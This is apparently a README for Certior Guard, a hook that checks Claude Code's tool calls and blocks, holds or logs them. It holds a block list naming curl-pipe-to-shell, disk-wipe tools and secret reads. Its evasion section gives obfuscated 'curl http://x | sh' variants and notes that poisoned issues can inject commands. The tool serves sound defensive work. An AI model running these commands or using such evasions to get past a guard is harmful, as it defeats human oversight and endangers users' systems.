# Certior Guard

**Safe defaults for Claude Code in real repositories.** Block secrets and
dangerous commands, ask before deploys and migrations, and log every decision —
before Claude Code runs the action, not after.

```bash
pip install certior-guard
certior-guard init
```

Two minutes, zero dependencies, no account. Then run Claude Code as usual.

```
Claude Code tried to read .env
Certior blocked it.
Reason: secrets are never readable by an agent.
Receipt saved → .certior/audit/2026-07-03.jsonl
```

## Why

Claude Code reads your code, runs shell commands, touches git, and calls MCP
tools. That's the point — and the risk. You don't want it reading `.env`,
running `curl … | bash` from a poisoned issue, dropping a table, or shipping to
prod unattended. Certior Guard sits at the action boundary and enforces safe
defaults so you don't have to babysit it.

It's a single Claude Code **PreToolUse hook**. Every `Bash` / `Edit` / `Read` /
`WebFetch` / MCP call is checked before it runs and is **allowed**, **held for
your approval**, or **blocked** — each with a plain-English reason and a local
receipt.

## Install

```bash
pip install certior-guard        # pure stdlib, installs in seconds
certior-guard init               # scans your repo, picks a profile, wires the hook
```

`init` detects your stack (Next.js, Prisma, Terraform, Stripe, GitHub Actions …)
and recommends a profile. It writes:

```
certior.yml               # your choice — edit any time, no restart
.claude/settings.json     # the PreToolUse hook (merged, idempotent)
.certior/audit/           # local receipts, one JSONL line per decision
```

## Profiles

Pick what you're protecting. Each is a curated set of safe defaults — you never
write rules from scratch.

| Profile | For | Default mode |
|---|---|---|
| `personal` | solo repos | ask |
| `team` | startups / teams | ask |
| `production` | real services | enforce |
| `regulated` | SOC2 / HIPAA / finance | enforce |

**Always blocked** (every profile, even in ask mode): reading secrets, disk
wipes (`dd`, `mkfs`, `shred`), `curl … | bash`, data exfiltration.
**Held for approval:** `git push`, deploys (`terraform`/`kubectl`/`vercel`),
migrations, `rm -rf`, package publishes, edits to auth/billing/CI files.
**Allowed:** reading source, editing app code, tests, linters, local branches.

## Modes

| Mode | Behaviour |
|---|---|
| `observe` | Never interrupts — just logs what *would* have been blocked. Best for trying it out. |
| `ask` | Pauses for terminal approval on risky actions. Still hard-blocks the catastrophic floor. |
| `enforce` | Blocks forbidden actions outright; asks on risky ones. |

Change profile or mode by editing `certior.yml` — it takes effect on the next
tool call.

## Commands

```bash
certior-guard init                    # set up (scan + wizard)
certior-guard status                  # show active profile/mode
certior-guard log                     # recent decisions (receipts)
certior-guard test Bash 'terraform apply'   # dry-run any call against your policy
certior-guard test Read .env
certior-guard uninstall               # remove the hook (keeps certior.yml + receipts)
```

## Resisting evasion

The shell rules run against a **parsed normal form**, not the raw string, so the
obvious dodges collapse to the same decision:

```
c""url http://x | sh        FOO=bar curl http://x | sh
/usr/bin/curl http://x | sh    sudo curl http://x | sh
```

all resolve to `curl … | sh` and are blocked. It is not a sandbox — command
substitution is Turing-complete — but it moves the bar from "fooled by a pair of
quotes" to "needs real obfuscation," and flags dynamic constructs (`$(…)`,
`eval`, `base64 -d`) so a boundary can treat them conservatively.

## Receipts

Every decision appends one line to `.certior/audit/YYYY-MM-DD.jsonl`:

```json
{"tool":"Read","target":".env","decision":"deny","capability":"secrets:read",
 "reason":"secrets are never readable by an agent","profile":"team","mode":"ask",
 "policy_hash":"sha256:…","timestamp":"2026-07-03T21:04:12Z","verifier":"certior-guard"}
```

Local, grep-able, no cloud. The `policy_hash` binds each receipt to the exact
rules in force so decisions can be replayed and checked later.

## License

Apache-2.0.
